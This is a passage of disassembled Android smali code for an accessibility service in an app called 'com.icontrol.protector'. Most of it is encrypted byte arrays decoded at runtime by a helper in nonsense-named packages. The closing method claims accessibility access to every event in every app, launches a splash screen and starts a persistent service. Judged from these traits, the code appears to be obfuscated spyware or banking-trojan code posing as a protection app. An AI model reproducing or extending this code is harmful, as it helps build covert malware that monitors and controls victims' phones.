    .array-data 1
        0x17t
        0x67t
        0x33t
        0x72t
        0x37t
        0x7at
        -0x3at
        -0xbt
        0x16t
        0x5ct
        0x32t
        0x44t
        0x37t
        0x72t
    .end array-data

    nop

    :array_8a
    .array-data 1
        -0x3at
        -0x1ct
        -0x1dt
        -0x3at
        -0x19t
        -0x36t
        0x16t
        0x4et
    .end array-data

    :array_8b
    .array-data 1
        -0x7bt
        0x72t
        -0x30t
        0x20t
        -0x77t
        -0x20t
        -0x7ft
        -0x27t
        -0x80t
        0x65t
    .end array-data

    nop

    :array_8c
    .array-data 1
        -0x1ft
        0x17t
        -0x47t
        0x4et
        -0x6t
        -0x6ct
        -0x20t
        -0x4bt
    .end array-data

    :array_8d
    .array-data 1
        0x26t
        -0x22t
        0x62t
        -0x42t
        0x75t
        -0xbt
        -0x78t
        -0x36t
        0x2bt
        -0x33t
        0x79t
        -0x4ft
    .end array-data

    :array_8e
    .array-data 1
        0x47t
        -0x58t
        0xbt
        -0x30t
        0x6t
        -0x7ft
        -0x17t
        -0x5at
    .end array-data

    :array_8f
    .array-data 1
        0x68t
        0x51t
        -0x3bt
        -0x11t
        -0x66t
        0x69t
        -0x54t
        -0x79t
    .end array-data

    :array_90
    .array-data 1
        -0x5ct
        -0x25t
        -0x37t
        0x6at
    .end array-data

    :array_91
    .array-data 1
        -0x36t
        -0x52t
        -0x5bt
        0x6t
        0x13t
        -0x5et
        -0x36t
        0x57t
    .end array-data

    :array_92
    .array-data 1
        -0xct
        -0x60t
        0x7bt
        -0x2et
        -0x3ft
        -0x63t
        0x24t
        -0x18t
        -0x8t
        -0x5at
        0x72t
        -0x2et
        -0x2dt
        -0x6at
        0x34t
        -0x12t
        -0x2t
        -0x5ft
        0x71t
        -0x71t
    .end array-data

    :array_93
    .array-data 1
        -0x69t
        -0x31t
        0x16t
        -0x4t
        -0x60t
        -0xdt
        0x40t
        -0x66t
    .end array-data

    :array_94
    .array-data 1
        -0x7bt
        -0x2bt
        -0x2at
        0x7dt
        -0x8t
        -0x79t
        -0x67t
        0x6et
        -0x77t
        -0x2dt
        -0x21t
        0x7dt
        -0x16t
        -0x74t
        -0x77t
        0x68t
        -0x71t
        -0x2ct
        -0x24t
        0x20t
        -0x5dt
        -0x80t
        -0x67t
        0x33t
        -0x7bt
        -0x2bt
        -0x29t
        0x3ft
        -0x8t
        -0x67t
        -0x72t
        0x75t
        -0x78t
        -0x23t
        -0x1ct
        0x27t
        -0xat
        -0x7at
        -0x6ft
        0x7et
        -0x79t
        -0x38t
    .end array-data

    nop

    :array_95
    .array-data 1
        -0x1at
        -0x46t
        -0x45t
        0x53t
        -0x67t
        -0x17t
        -0x3t
        0x1ct
    .end array-data

    :array_96
    .array-data 1
        0x5ct
        -0x22t
        -0x72t
        -0x55t
        0x21t
        -0x56t
        -0x1dt
        -0x59t
        0x50t
        -0x28t
        -0x79t
        -0x55t
        0x33t
        -0x5ft
        -0xdt
        -0x5ft
        0x56t
        -0x21t
        -0x7ct
        -0xat
        0x7at
        -0x53t
        -0x1dt
        -0x6t
        0x5et
        -0x2et
        -0x69t
        -0x14t
        0x2ft
        -0x56t
        -0x28t
        -0x49t
        0x5et
        -0x3dt
        -0x44t
        -0xft
        0x29t
        -0x50t
        -0x15t
        -0x50t
        0x60t
        -0x2ct
        -0x65t
        -0xbt
        0x21t
        -0x56t
        -0x1dt
    .end array-data

    :array_97
    .array-data 1
        0x3ft
        -0x4ft
        -0x1dt
        -0x7bt
        0x40t
        -0x3ct
        -0x79t
        -0x2bt
    .end array-data

    :array_98
    .array-data 1
        -0x54t
        0x7et
        0x66t
        -0x1ft
        0x5t
        0x71t
        0x7ct
        -0x2et
        -0x60t
        0x78t
        0x6ft
        -0x1ft
        0x17t
        0x66t
        0x6bt
        -0x2ct
        -0x56t
        0x7ct
        0x7et
        -0x5at
    .end array-data

    :array_99
    .array-data 1
        -0x31t
        0x11t
        0xbt
        -0x31t
        0x64t
        0x1ft
        0x18t
        -0x60t
    .end array-data

    :array_9a
    .array-data 1
        -0x1t
        0x38t
        -0x4et
        -0x6at
        -0x80t
        0xft
        -0x56t
        -0x41t
        -0xdt
        0x3et
        -0x45t
        -0x6at
        -0x6et
        0x18t
        -0x43t
        -0x47t
        -0x7t
        0x3at
        -0x56t
        -0x2ft
        -0x25t
        0x8t
        -0x56t
        -0x1et
        -0x14t
        0x25t
        -0x4at
        -0x32t
        -0x80t
        0x2t
        -0x49t
        -0x6et
        -0x8t
        0x3et
        -0x42t
        -0x2ct
        -0x72t
        0x6t
        -0x6ft
        -0x5ct
        -0x18t
        0x32t
        -0x4et
        -0x19t
        -0x77t
        0x4t
        -0x51t
        -0x57t
        -0x7t
        0x25t
        -0x80t
        -0x35t
        -0x6ct
        0xct
        -0x5dt
        -0x54t
        -0x12t
        0x2et
    .end array-data

    nop

    :array_9b
    .array-data 1
        -0x64t
        0x57t
        -0x21t
        -0x48t
        -0x1ft
        0x61t
        -0x32t
        -0x33t
    .end array-data

    :array_9c
    .array-data 1
        -0x1ft
        0x5bt
        0x57t
        -0xat
        -0x19t
        -0x75t
        0x78t
        -0x62t
        -0x13t
        0x5dt
        0x5et
        -0xat
        -0xbt
        -0x64t
        0x6ft
        -0x68t
        -0x19t
        0x59t
        0x4ft
        -0x4ft
        -0x44t
        -0x74t
        0x78t
        -0x3dt
        -0xet
        0x46t
        0x53t
        -0x52t
        -0x19t
        -0x7at
        0x65t
        -0x4dt
        -0x15t
        0x40t
        0x5ft
        -0x4bt
    .end array-data

    :array_9d
    .array-data 1
        -0x7et
        0x34t
        0x3at
        -0x28t
        -0x7at
        -0x1bt
        0x1ct
        -0x14t
    .end array-data

    :array_9e
    .array-data 1
        -0x10t
        -0x68t
        0x3ft
        0x22t
        0x1t
        -0x56t
        0x39t
        -0x5ft
        -0x1at
        -0x67t
        0x35t
        0x22t
        0x13t
        -0x58t
        0x37t
        -0x49t
        -0x20t
        -0x7ct
        0x3bt
        0x6et
        0x1bt
        -0x59t
        0x3dt
        -0x5at
        -0x16t
    .end array-data

    nop

    :array_9f
    .array-data 1
        -0x6dt
        -0x9t
        0x52t
        0xct
        0x72t
        -0x35t
        0x54t
        -0x2et
    .end array-data

    :array_a0
    .array-data 1
        0x68t
        -0x39t
        -0xat
        0x22t
        -0x74t
        -0x51t
        -0x79t
        -0x30t
        0x7et
        -0x3at
        -0x4t
        0x22t
        -0x62t
        -0x53t
        -0x77t
        -0x3at
        0x78t
        -0x25t
        -0xet
        0x6et
        -0x6at
        -0x5et
        -0x7dt
        -0x29t
        0x72t
        -0x6et
        -0xet
        0x68t
        -0x30t
        -0x53t
        -0x7bt
        -0x31t
        0x67t
        -0x37t
        -0x15t
        0x7ft
        -0x6at
        -0x60t
        -0x73t
        -0x4t
        0x6at
        -0x28t
        -0x15t
        0x6et
        -0x62t
        -0x44t
        -0x4bt
        -0x3at
        0x73t
        -0x24t
        -0x2t
        0x62t
        -0x65t
        -0x55t
        -0x72t
        -0x4t
        0x7ft
        -0x3ft
        -0x11t
        0x60t
        -0x66t
    .end array-data

    nop

    :array_a1
    .array-data 1
        0xbt
        -0x58t
        -0x65t
        0xct
        -0x1t
        -0x32t
        -0x16t
        -0x5dt
    .end array-data

    :array_a2
    .array-data 1
        0x1ct
        -0x53t
        -0x37t
        -0x1et
        -0x5dt
        0xdt
        -0x2ct
    .end array-data

    :array_a3
    .array-data 1
        0x7dt
        -0x23t
        -0x47t
        -0x54t
        -0x3et
        0x60t
        -0x4ft
        0x8t
    .end array-data

    :array_a4
    .array-data 1
        0x57t
        -0x43t
        0x46t
        -0x6t
        0x35t
        -0x66t
        -0x2bt
        0x26t
        0x70t
        -0x5et
        0x43t
        -0x4ct
        0x3ft
        -0x2bt
        -0x39t
        0x69t
        0x64t
        -0x13t
        0x46t
        -0x4ft
        0x3ct
        -0x31t
        -0x7ft
    .end array-data

    :array_a5
    .array-data 1
        0x16t
        -0x33t
        0x36t
        -0x26t
        0x5bt
        -0xbt
        -0x5ft
        0x6t
    .end array-data

    :array_a6
    .array-data 1
        -0x50t
        -0x9t
        -0xbt
        0x1ft
        -0x6dt
        0x21t
        -0x68t
    .end array-data

    :array_a7
    .array-data 1
        -0x3bt
        -0x67t
        -0x42t
        0x71t
        -0x4t
        0x56t
        -0xat
        0x26t
    .end array-data

    :array_a8
    .array-data 1
        0x74t
        0x43t
        -0x6ft
        0x0t
        -0x48t
        0x22t
        -0x28t
        -0x17t
    .end array-data

    :array_a9
    .array-data 1
        0x52t
        -0x22t
        0x19t
        -0x6t
        0x2ft
        0x72t
        -0x5bt
        0x9t
        0x74t
        -0x37t
        0x15t
        -0x32t
        0x21t
        0x64t
    .end array-data

    nop

    :array_aa
    .array-data 1
        0x0t
        -0x45t
        0x7at
        -0x5bt
        0x44t
        0x17t
        -0x24t
        0x7at
    .end array-data

    :array_ab
    .array-data 1
        0x1t
        0x4ft
        0x34t
        -0x36t
        -0x47t
        -0x32t
        -0x5ft
        0x3ft
        0xat
    .end array-data

    nop

    :array_ac
    .array-data 1
        0x4dt
        0x6t
        0x62t
        -0x71t
        -0x1at
        -0x7bt
        -0x13t
        0x70t
    .end array-data

    :array_ad
    .array-data 1
        -0x6dt
        -0x5ct
        0x4at
        -0x39t
        -0x45t
        -0x54t
        0x53t
        0x4ct
    .end array-data

    :array_ae
    .array-data 1
        0x3dt
        -0x7bt
        -0x74t
        0x57t
        0x3t
        0x76t
        -0x49t
        -0x27t
        0x14t
        -0x7bt
        -0x67t
        0x4ct
        0x57t
        0x72t
        -0x47t
        -0x36t
        0x5t
        -0x2at
        -0x62t
        0x3t
        0x13t
        0x7at
        -0x57t
        -0x38t
        0x2t
        -0x37t
        -0x78t
        0x47t
        0x57t
        0x72t
        -0x56t
        -0x27t
        0x40t
        -0x61t
    .end array-data

    nop

    :array_af
    .array-data 1
        0x60t
        -0x5bt
        -0x13t
        0x23t
        0x77t
        0x13t
        -0x26t
        -0x57t
    .end array-data

    :array_b0
    .array-data 1
        0x4ft
        0x17t
        0x40t
        -0x6bt
        -0x34t
        -0x4ct
        -0x1ft
        0x5ct
        0x62t
        0xct
        0xdt
        -0x61t
        -0x36t
        -0x4dt
        -0x72t
        0x6et
        0x7et
        0x10t
    .end array-data

    nop

    :array_b1
    .array-data 1
        0xet
        0x63t
        0x6et
        -0xct
        -0x51t
        -0x29t
        -0x31t
        0x1et
    .end array-data

    :array_b2
    .array-data 1
        0x5ct
        0x1ft
        0x71t
        0x25t
        0x4bt
        -0x22t
        0x3ft
        -0x67t
        0x53t
        0x19t
        0x66t
        0x34t
        0xft
    .end array-data

    nop

    :array_b3
    .array-data 1
        0x36t
        0x7at
        0x12t
        0x51t
        0x6bt
        -0x46t
        0x5at
        -0x13t
    .end array-data

    :array_b4
    .array-data 1
        0x7dt
        0x66t
        0x7ft
        0x10t
        -0x63t
        0x64t
        -0x51t
        -0x5t
        0x69t
        0x3bt
    .end array-data

    nop

    :array_b5
    .array-data 1
        0xdt
        0x14t
        0x10t
        0x64t
        -0x8t
        0x7t
        -0x25t
        -0x62t
    .end array-data

    :array_b6
    .array-data 1
        -0x1ft
        -0x6at
        -0x1ft
        -0x7et
        0x3t
        -0x22t
        0x4ft
        -0x1ct
        -0x46t
        -0x6et
        -0x1dt
    .end array-data

    :array_b7
    .array-data 1
        -0x32t
        -0x1t
        -0x71t
        -0x1at
        0x66t
        -0x5at
        0x61t
        -0x74t
    .end array-data

    :array_b8
    .array-data 1
        -0x5ct
        -0x46t
        0x6ct
        -0x9t
        0x6bt
        -0x13t
        -0x55t
        0x5ft
    .end array-data

    :array_b9
    .array-data 1
        -0x31t
        -0x21t
        0x15t
        -0x70t
        0x1et
        -0x74t
        -0x27t
        0x3bt
    .end array-data

    :array_ba
    .array-data 1
        -0x20t
        0x41t
        0x5et
        0x13t
        -0x31t
        0x53t
        -0x33t
        0x72t
        -0x33t
        0x5at
        0x13t
        0x19t
        -0x37t
        0x54t
        -0x5et
        0x40t
        -0x2ft
        0x46t
    .end array-data

    nop

    :array_bb
    .array-data 1
        -0x5ft
        0x35t
        0x70t
        0x72t
        -0x54t
        0x30t
        -0x1dt
        0x30t
    .end array-data

    :array_bc
    .array-data 1
        -0x42t
        -0x5ct
        -0x62t
        -0x47t
        0x1at
        0x5ft
        -0x3et
        0x6bt
        -0x6dt
        -0x41t
        -0x2dt
        -0x4dt
        0x1ct
        0x58t
        -0x53t
        0x59t
        -0x71t
        -0x5dt
    .end array-data

    nop

    :array_bd
    .array-data 1
        -0x1t
        -0x30t
        -0x50t
        -0x28t
        0x79t
        0x3ct
        -0x14t
        0x29t
    .end array-data

    :array_be
    .array-data 1
        -0x7dt
        -0x7ct
        0x26t
        0x55t
        0x1ft
        -0x6t
        0x60t
        0xet
        -0x5et
    .end array-data

    nop

    :array_bf
    .array-data 1
        -0x2ft
        -0x1ft
        0x45t
        0xat
        0x73t
        -0x6dt
        0xet
        0x65t
    .end array-data

    :array_c0
    .array-data 1
        0x28t
        0x3ft
        0x17t
        0x6bt
        0x5ct
        -0x20t
        0x78t
        0x2at
    .end array-data

    :array_c1
    .array-data 1
        0x66t
        0x50t
        0x63t
        0x2dt
        0x33t
        -0x6bt
        0x16t
        0x4et
    .end array-data

    :array_c2
    .array-data 1
        0x7ct
        -0x41t
        0x32t
        0x48t
        -0x19t
        0x5et
        0x0t
        0x1at
        0x73t
        -0x4bt
        0x71t
        0x7t
        -0x12t
        0x55t
        0x1dt
        0x12t
        0x76t
        -0x4ct
        0x71t
        0xft
        -0x12t
        0x41t
        0x1at
        0x9t
        0x72t
        -0x4bt
        0x2bt
        0xet
        -0x11t
        0x55t
        0x41t
        0x11t
        0x7et
        -0x5ct
        0x36t
        0x8t
    .end array-data

    :array_c3
    .array-data 1
        0x1ft
        -0x30t
        0x5ft
        0x66t
        -0x80t
        0x31t
        0x6ft
        0x7dt
    .end array-data

    :array_c4
    .array-data 1
        0x24t
        -0xdt
        -0x1t
        0x5ct
        0x4t
        0x57t
        -0x19t
        0x12t
    .end array-data

    :array_c5
    .array-data 1
        0x6at
        -0x64t
        -0x75t
        0x1at
        0x6bt
        0x22t
        -0x77t
        0x76t
    .end array-data

    :array_c6
    .array-data 1
        -0x6t
        0x61t
        0x17t
        -0x4et
        0x12t
        0x53t
        0x3ft
        0x7ft
        -0x25t
    .end array-data

    nop

    :array_c7
    .array-data 1
        -0x58t
        0x4t
        0x74t
        -0x13t
        0x7et
        0x3at
        0x51t
        0x14t
    .end array-data

    :array_c8
    .array-data 1
        -0x6ft
        0x3bt
        0x25t
        -0x16t
        -0x2at
        -0x62t
        0x46t
        -0x53t
    .end array-data

    :array_c9
    .array-data 1
        0x2ft
        -0x4dt
        0x5t
        0x2et
        -0x6et
        -0x7et
        0x2dt
        0x69t
    .end array-data

    :array_ca
    .array-data 1
        0xet
        -0x79t
        -0x26t
        0x49t
        -0x72t
        0x33t
        -0x2dt
        0x33t
        0x38t
        -0x6ct
        -0x3at
        0x7t
        -0x25t
    .end array-data

    nop

    :array_cb
    .array-data 1
        0x6dt
        -0x1at
        -0x56t
        0x3dt
        -0x5t
        0x41t
        -0x4at
        0x57t
    .end array-data

    :array_cc
    .array-data 1
        0x72t
        -0x5bt
        0x37t
        0x6t
        0x64t
        0x69t
    .end array-data

    nop

    :array_cd
    .array-data 1
        0x36t
        -0x1ct
        0x63t
        0x43t
        0x5et
        0x49t
        0x9t
        0x35t
    .end array-data

    :array_ce
    .array-data 1
        0x3ct
        0x77t
        0x4et
        0x60t
        -0x29t
    .end array-data

    nop

    :array_cf
    .array-data 1
        0x2t
        0x22t
        0x1ct
        0x2ct
        -0x13t
        -0x3bt
        0x6t
        -0x74t
    .end array-data

    :array_d0
    .array-data 1
        -0x45t
        -0x45t
        0x79t
        0x24t
        -0x3t
        -0x6ft
        -0x3ct
        -0x48t
        -0x56t
        -0x43t
        0x77t
        0x27t
        -0x15t
    .end array-data

    nop

    :array_d1
    .array-data 1
        -0x7t
        -0x37t
        0x16t
        0x53t
        -0x72t
        -0xct
        -0x4at
        -0x68t
    .end array-data

    :array_d2
    .array-data 1
        0x7dt
        0x62t
        0x3bt
        -0x2dt
        -0x4ct
        -0x12t
        0x44t
        -0x33t
        0xbt
    .end array-data

    nop

    :array_d3
    .array-data 1
        0x2bt
        0xbt
        0x48t
        -0x46t
        -0x40t
        -0x75t
        0x20t
        -0x9t
    .end array-data

    :array_d4
    .array-data 1
        -0x3bt
        0x68t
        0x24t
        -0x57t
        0x49t
        0x4ct
        0x32t
        0x69t
    .end array-data

    :array_d5
    .array-data 1
        -0x75t
        0x27t
        0x70t
        -0x11t
        0x6t
        0x19t
        0x7ct
        0x2dt
    .end array-data

    :array_d6
    .array-data 1
        -0xdt
        -0x10t
        0x36t
        0x5dt
        0x34t
        -0x53t
        0x27t
        -0x7ft
        -0x39t
        -0x4t
        0x36t
        0x63t
        0xet
        -0x55t
        0x3ct
        -0x7at
        -0x2et
    .end array-data

    nop

    :array_d7
    .array-data 1
        -0x5ft
        -0x6bt
        0x55t
        0x2t
        0x7at
        -0x3et
        0x53t
        -0x18t
    .end array-data

    :array_d8
    .array-data 1
        -0x67t
        -0x64t
        0x45t
        -0x2ft
        0x20t
        -0x5dt
        -0x71t
        -0x44t
    .end array-data

    :array_d9
    .array-data 1
        -0x2bt
        -0xbt
        0x33t
        -0x72t
        0x4et
        -0x34t
        -0x5t
        -0x3bt
    .end array-data

    :array_da
    .array-data 1
        0x10t
        -0x6ct
        -0x77t
    .end array-data

    :array_db
    .array-data 1
        0x5et
        -0x45t
        -0x38t
        0x7et
        -0x79t
        0x38t
        -0x3ct
        -0x25t
    .end array-data

    :array_dc
    .array-data 1
        0x56t
        -0x4t
        -0x12t
        -0x1dt
        0x3ft
        -0x1ft
        -0x6ft
        0x3t
        0x43t
        -0x5t
        -0x2t
        -0x3t
        0x35t
    .end array-data

    nop

    :array_dd
    .array-data 1
        0x37t
        -0x6et
        -0x76t
        -0x6ft
        0x50t
        -0x78t
        -0xbt
        0x2dt
    .end array-data

    :array_de
    .array-data 1
        0x7t
        0x12t
        -0x79t
        0x1t
        -0x3ct
        -0x15t
        0x5dt
        0x61t
        0x12t
        0x15t
        -0x69t
        0x1ft
        -0x32t
    .end array-data

    nop

    :array_df
    .array-data 1
        0x66t
        0x7ct
        -0x1dt
        0x73t
        -0x55t
        -0x7et
        0x39t
        0x4ft
    .end array-data

    :array_e0
    .array-data 1
        0x29t
        -0x4ct
        0x72t
    .end array-data

    :array_e1
    .array-data 1
        0x67t
        -0x65t
        0x33t
        -0x7ft
        0x0t
        -0x3t
        0x74t
        0x2et
    .end array-data

    :array_e2
    .array-data 1
        -0x2ft
        0x2ct
        -0x42t
        0x67t
        -0x6dt
        -0x4et
        0x2ct
        -0x3ft
        -0x3ct
        0x27t
        -0x5et
        0x61t
    .end array-data

    :array_e3
    .array-data 1
        -0x50t
        0x42t
        -0x26t
        0x15t
        -0x4t
        -0x25t
        0x48t
        -0x11t
    .end array-data

    :array_e4
    .array-data 1
        0x6ft
        0x62t
        0xct
        0x73t
        -0x74t
        -0x4dt
        0x36t
        -0x1dt
        0x7at
        0x69t
        0x10t
        0x75t
    .end array-data

    :array_e5
    .array-data 1
        0xet
        0xct
        0x68t
        0x1t
        -0x1dt
        -0x26t
        0x52t
        -0x33t
    .end array-data

    :array_e6
    .array-data 1
        0x36t
        -0x4dt
        -0x3t
        -0x3at
        -0x77t
        0x70t
        -0x6dt
        0x33t
    .end array-data

    :array_e7
    .array-data 1
        -0x3at
        -0x38t
        0x42t
        0x1ct
        -0x4t
        -0x49t
        -0x3ft
        -0x38t
    .end array-data

    :array_e8
    .array-data 1
        -0x48t
        0x14t
        0x5ft
        0x6ft
        -0x1et
        -0x53t
        -0x41t
        0x29t
    .end array-data

    :array_e9
    .array-data 1
        -0x51t
        -0x53t
        -0x65t
        0x15t
        -0x1dt
        -0x3at
        0x17t
        -0x47t
    .end array-data

    :array_ea
    .array-data 1
        -0x4ft
        0x60t
        0x41t
        -0x78t
        -0x14t
        -0x24t
        0x66t
        -0x7ft
        -0x61t
        0x60t
        0x6t
        -0x51t
        -0x1at
    .end array-data

    nop

    :array_eb
    .array-data 1
        -0x10t
        0x14t
        0x6ft
        -0x37t
        -0x71t
        -0x41t
        0x48t
        -0x11t
    .end array-data

    :array_ec
    .array-data 1
        0x54t
        0x34t
        0x4et
        0x5bt
        0x17t
    .end array-data

    nop

    :array_ed
    .array-data 1
        0x1ft
        0x5at
        0x21t
        0x2ct
        0x79t
        -0x49t
        -0x27t
        -0x2ct
    .end array-data

    :array_ee
    .array-data 1
        0x3t
        -0x38t
        0x4ft
        -0x3bt
        0x3ct
    .end array-data

    nop

    :array_ef
    .array-data 1
        0x48t
        -0x5at
        0x20t
        -0x4et
        0x52t
        0x5t
        0x78t
        0x42t
    .end array-data

    :array_f0
    .array-data 1
        0x42t
        -0x3et
        0x0t
        0x1t
        0x46t
        0x21t
        -0x41t
        0x1dt
    .end array-data

    :array_f1
    .array-data 1
        0x10t
        -0x59t
        0x63t
        0x5et
        0x27t
        0x51t
        -0x31t
        0x6et
    .end array-data

    :array_f2
    .array-data 1
        0x4et
        -0x4ct
        0x60t
        -0x17t
        0x3ft
        -0x47t
    .end array-data

    nop

    :array_f3
    .array-data 1
        0x32t
        -0xft
        0x38t
        -0x60t
        0x6bt
        -0x3bt
        -0x7ft
        0x2et
    .end array-data

    :array_f4
    .array-data 1
        0x4bt
        0x35t
        0x53t
        -0x73t
        -0x6t
        0x52t
        -0x2at
        0x3t
    .end array-data

    :array_f5
    .array-data 1
        0x19t
        0x50t
        0x30t
        -0x2et
        -0x65t
        0x22t
        -0x5at
        0x70t
    .end array-data

    :array_f6
    .array-data 1
        0x31t
        -0x59t
        0x1t
        0x5et
        -0xft
        0x74t
        0x50t
    .end array-data

    :array_f7
    .array-data 1
        0x4dt
        -0x1et
        0x4ft
        0xat
        -0x4ct
        0x26t
        0x2ct
        -0x1ft
    .end array-data

    :array_f8
    .array-data 1
        0x7dt
        0x4bt
        0x38t
        -0x7ct
        0x4at
        -0x24t
        -0x5at
        0x1bt
        0x48t
        0x5et
    .end array-data

    nop

    :array_f9
    .array-data 1
        0x3ct
        0x3bt
        0x48t
        -0x9t
        0x6at
        -0x71t
        -0x2et
        0x7at
    .end array-data

    :array_fa
    .array-data 1
        -0x29t
        -0x5at
        -0x39t
        -0x72t
        0x2et
        0xet
        -0x6at
        -0x21t
        -0x14t
        -0x11t
        -0x7et
    .end array-data

    :array_fb
    .array-data 1
        -0x7et
        -0x2bt
        -0x5et
        -0x4t
        0xet
        0x61t
        -0x1at
        -0x46t
    .end array-data

    :array_fc
    .array-data 1
        0xft
        0x50t
        0x43t
        0x1t
        -0x66t
        -0x74t
        -0x69t
        0x10t
        0x27t
        0x57t
        0x4t
        0x14t
        -0x64t
        -0x75t
    .end array-data

    nop

    :array_fd
    .array-data 1
        0x4et
        0x24t
        0x6dt
        0x60t
        -0x7t
        -0x11t
        -0x47t
        0x66t
    .end array-data

    :array_fe
    .array-data 1
        -0x55t
        -0x4dt
        0x51t
        0x23t
        0x8t
        0x29t
        -0x51t
        -0x2t
        -0x7at
        -0x58t
        0x1dt
    .end array-data

    :array_ff
    .array-data 1
        -0x16t
        -0x39t
        0x7ft
        0x42t
        0x6bt
        0x4at
        -0x7ft
        -0x47t
    .end array-data
.end method

.method public onInterrupt()V
    .locals 0

    return-void
.end method

.method public onServiceConnected()V
    .locals 15

    invoke-super {p0}, Landroid/accessibilityservice/AccessibilityService;->onServiceConnected()V

    const/16 v0, 0x1a

    const/4 v1, 0x0

    const/4 v2, -0x1

    :try_start_0
    new-instance v3, Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const-class v5, Lcom/icontrol/protector/Splasher;

    invoke-direct {v3, v4, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v4, 0x10000000

    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v3}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    new-instance v3, Landroid/accessibilityservice/AccessibilityServiceInfo;

    invoke-direct {v3}, Landroid/accessibilityservice/AccessibilityServiceInfo;-><init>()V

    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v5, 0x1e

    if-lt v4, v5, :cond_0

    const v5, 0x807f

    iput v5, v3, Landroid/accessibilityservice/AccessibilityServiceInfo;->flags:I

    goto :goto_0

    :catch_0
    move-exception v3

    goto :goto_2

    :cond_0
    const/16 v5, 0x7f

    iput v5, v3, Landroid/accessibilityservice/AccessibilityServiceInfo;->flags:I

    :goto_0
    iput v2, v3, Landroid/accessibilityservice/AccessibilityServiceInfo;->eventTypes:I

    const-wide/16 v5, 0x0

    iput-wide v5, v3, Landroid/accessibilityservice/AccessibilityServiceInfo;->notificationTimeout:J

    const/4 v5, 0x0

    iput-object v5, v3, Landroid/accessibilityservice/AccessibilityServiceInfo;->packageNames:[Ljava/lang/String;

    iput v2, v3, Landroid/accessibilityservice/AccessibilityServiceInfo;->feedbackType:I

    invoke-virtual {p0, v3}, Landroid/accessibilityservice/AccessibilityService;->setServiceInfo(Landroid/accessibilityservice/AccessibilityServiceInfo;)V

    sput-object p0, Lcom/icontrol/protector/WorkServices;->o:Lcom/icontrol/protector/AccessServices;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-virtual {p0, v3}, Lcom/icontrol/protector/AccessServices;->d(Landroid/content/Context;)V

    new-instance v3, Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    const-class v6, Lcom/icontrol/protector/AccessServices;

    invoke-direct {v3, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    if-lt v4, v0, :cond_1

    invoke-static {p0, v3}, Lntidisestablish/neumonoul/floccinaucinih/w;->a(Lcom/icontrol/protector/AccessServices;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_1

    :cond_1
    invoke-virtual {p0, v3}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :goto_1
    const/16 v3, 0x1f

    if-lt v4, v3, :cond_2

    invoke-virtual {p0, v1, v1}, Lcom/icontrol/protector/AccessServices;->setAccessibilityFocusAppearance(II)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_3

    :goto_2
    invoke-virtual {v3}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_2
    :goto_3
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const/4 v4, 0x6

    new-array v5, v4, [B

    fill-array-data v5, :array_0

    const/16 v6, 0x8

    new-array v7, v6, [B

    fill-array-data v7, :array_1

    invoke-static {v5, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {p0, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/view/WindowManager;

    new-instance v7, Landroid/util/DisplayMetrics;

    invoke-direct {v7}, Landroid/util/DisplayMetrics;-><init>()V

    invoke-interface {v5}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v5

    invoke-virtual {v5, v7}, Landroid/view/Display;->getMetrics(Landroid/util/DisplayMetrics;)V

    iget v5, v7, Landroid/util/DisplayMetrics;->widthPixels:I

    iget v7, v7, Landroid/util/DisplayMetrics;->heightPixels:I

    const/4 v8, 0x4

    new-array v9, v8, [B

    fill-array-data v9, :array_2

    new-array v10, v6, [B

    fill-array-data v10, :array_3

    invoke-static {v9, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-static {v5}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    invoke-static {v3, v9, v5}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Integer;->intValue()I

    move-result v5

    iput v5, p0, Lcom/icontrol/protector/AccessServices;->g:I

    new-array v5, v8, [B

    fill-array-data v5, :array_4

    new-array v9, v6, [B

    fill-array-data v9, :array_5

    invoke-static {v5, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {v7}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v7

    invoke-static {v3, v5, v7}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    iput v3, p0, Lcom/icontrol/protector/AccessServices;->h:I

    invoke-virtual {p0}, Lcom/icontrol/protector/AccessServices;->j()V

    :try_start_1
    new-array v3, v4, [B

    fill-array-data v3, :array_6

    new-array v5, v6, [B

    fill-array-data v5, :array_7

